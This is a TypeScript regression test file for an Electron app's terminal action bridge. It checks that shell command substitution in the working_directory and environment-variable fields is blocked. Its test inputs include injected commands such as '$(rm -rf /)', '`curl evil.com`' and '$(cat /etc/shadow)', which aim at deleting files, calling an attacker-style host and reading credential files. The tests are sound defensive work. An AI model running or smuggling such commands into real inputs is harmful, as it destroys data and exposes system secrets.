/**
 * FrontendActionBridge 命令替换注入防护回归测试
 *
 * 回归覆盖：
 *   EEL-001: working_directory 命令替换注入检测
 *   EEL-002: env key/value 命令替换注入检测
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

vi.mock('electron', () => ({
  app: { isPackaged: false, getPath: vi.fn(() => '/tmp') },
  BrowserWindow: vi.fn(),
  ipcMain: { handle: vi.fn(), on: vi.fn(), removeListener: vi.fn() },
}))
vi.mock('@tabtin/action-tools/adapters', () => {
  class MockAdapter {
    getRegisteredTools = vi.fn().mockReturnValue([])
    hasToolForAction = vi.fn().mockReturnValue(false)
    executeAction = vi.fn().mockResolvedValue({ success: true })
  }
  return { ActionExecutorAdapter: MockAdapter }
})
vi.mock('@tabtin/action-tools/impl', () => ({
  getSharedBrowserToolImpl: vi.fn().mockReturnValue({
    destroy: vi.fn().mockResolvedValue(undefined),
  }),
}))
vi.mock('@tabtin/terminal-core', async () => {
  const actual = await vi.importActual<typeof import('@tabtin/terminal-core')>('@tabtin/terminal-core')
  return {
    ...actual,
    getInteractiveTerminalPolicySupportError: vi.fn().mockReturnValue(null),
    normalizeTerminalExecutionPolicy: vi.fn().mockReturnValue({}),
    evaluateLocalFilePolicy: vi.fn().mockReturnValue({ blocked: false }),
    evaluateLocalTerminalPolicy: vi.fn().mockReturnValue({ blocked: false }),
    isAutoApprovedTerminalWrite: vi.fn().mockReturnValue(true),
  }
})
vi.mock('@tabtin/security-policy', async () => {
  const actual = await vi.importActual<typeof import('@tabtin/security-policy')>('@tabtin/security-policy')
  return { ...actual }
})
vi.mock('../ApprovalManager', () => ({ requestApproval: vi.fn() }))
vi.mock('../CDPNetworkBridge', () => ({ enableForTab: vi.fn() }))
vi.mock('../../auth', () => ({
  TokenManager: {
    getAccessToken: vi.fn(async () => null),
    getUserInfo: vi.fn(async () => null),
  },
}))
vi.mock('../../cli/cli-server', () => ({
  getCLISpaceId: vi.fn(),
  getCLICrawlspaceId: vi.fn(),
  getCLIOrganizationRoot: vi.fn().mockReturnValue(null),
}))
vi.mock('../../embedded-crawl-view', () => ({ getView: vi.fn() }))
vi.mock('../../view-factory', () => ({
  getViewFactory: vi.fn().mockReturnValue({ getWebContents: vi.fn().mockReturnValue(null) }),
}))
vi.mock('../../run-session/RunSessionManager', () => ({
  getRunSessionManager: vi.fn().mockReturnValue({
    createRun: vi.fn(),
    getRun: vi.fn(),
    openTab: vi.fn(),
    setActiveView: vi.fn(),
  }),
}))
vi.mock('../../crawlspace/CrawlspaceContextHub', () => ({
  getCrawlspaceContextHub: vi.fn().mockReturnValue({ getAllSnapshots: vi.fn().mockReturnValue([]) }),
}))
vi.mock('../StreamDownloadService', () => ({
  getStreamDownloadService: vi.fn().mockReturnValue({
    on: vi.fn(),
    removeListener: vi.fn(),
  }),
}))
vi.mock('../LocalMcpService', () => ({
  getLocalMcpService: vi.fn().mockReturnValue({
    dispose: vi.fn().mockResolvedValue(undefined),
  }),
}))
vi.mock('../../logger', () => ({
  createLogger: vi.fn().mockReturnValue({
    info: vi.fn(),
    debug: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}))
vi.mock('../tool-registry', () => ({ registerAllTools: vi.fn() }))
vi.mock('../bridge-core', () => ({
  setupCoreAPIs: vi.fn().mockReturnValue({ contextSpaceBridge: null }),
}))
vi.mock('../resource-actions', () => ({ setupResourceDetectionAPI: vi.fn() }))
vi.mock('../cdp-actions', () => ({ setupAllCDPActions: vi.fn() }))
vi.mock('../ContextSpaceToolBridge', () => ({}))

import { FrontendActionBridge } from '../FrontendActionBridge'

function makeTerminalAction(overrides: Record<string, any> = {}) {
  return {
    task_id: 'test-task',
    action: 'execute_in_terminal',
    params: { command: 'echo hello', ...overrides },
  } as any
}

describe('EEL-001: working_directory 命令替换注入防护', () => {
  let bridge: FrontendActionBridge
  const mockWindow = {} as any

  beforeEach(() => {
    bridge = new FrontendActionBridge(mockWindow)
  })

  it('blocks $() in working_directory', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ working_directory: '$(rm -rf ~)' }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('working_directory')
    expect(result.error).toContain('shell substitution')
    expect((result as any).error_code).toBe('POLICY_BLOCKED')
  })

  it('blocks backtick in working_directory', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ working_directory: '`curl evil.com`' }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('working_directory')
  })

  it('blocks <() process substitution in working_directory', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ working_directory: '/tmp/<(cat /etc/passwd)' }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('working_directory')
  })

  it('allows normal working_directory paths', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ working_directory: '/home/user/my-project' }),
    )
    expect((result as any).error_code).not.toBe('POLICY_BLOCKED')
  })

  it('allows undefined working_directory', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({}),
    )
    expect((result as any).error_code).not.toBe('POLICY_BLOCKED')
  })
})

describe('EEL-002: env key/value 命令替换注入防护', () => {
  let bridge: FrontendActionBridge
  const mockWindow = {} as any

  beforeEach(() => {
    bridge = new FrontendActionBridge(mockWindow)
  })

  it('blocks $() in env value', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ env: { PATH: '$(cat /etc/shadow)' } }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('Environment variable')
    expect(result.error).toContain('shell substitution')
    expect((result as any).error_code).toBe('POLICY_BLOCKED')
  })

  it('blocks backtick in env value', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ env: { EVIL: '`whoami`' } }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('Environment variable')
  })

  it('blocks <() process substitution in env value', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ env: { DATA: '<(cat /etc/passwd)' } }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('Environment variable')
  })

  it('allows safe env values', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ env: { NODE_ENV: 'production', LANG: 'en_US.UTF-8' } }),
    )
    expect((result as any).error_code).not.toBe('POLICY_BLOCKED')
  })

  it('allows undefined env', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({}),
    )
    expect((result as any).error_code).not.toBe('POLICY_BLOCKED')
  })

  it('blocks multiple malicious env entries (first match wins)', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({
        env: {
          SAFE: 'ok',
          EVIL: '$(rm -rf /)',
          ANOTHER: 'fine',
        },
      }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('EVIL')
  })

  it('blocks env with $() and space padding', async () => {
    const result = await bridge.executeAction(
      makeTerminalAction({ env: { VAR: '$( curl evil.com )' } }),
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('Environment variable')
  })
})
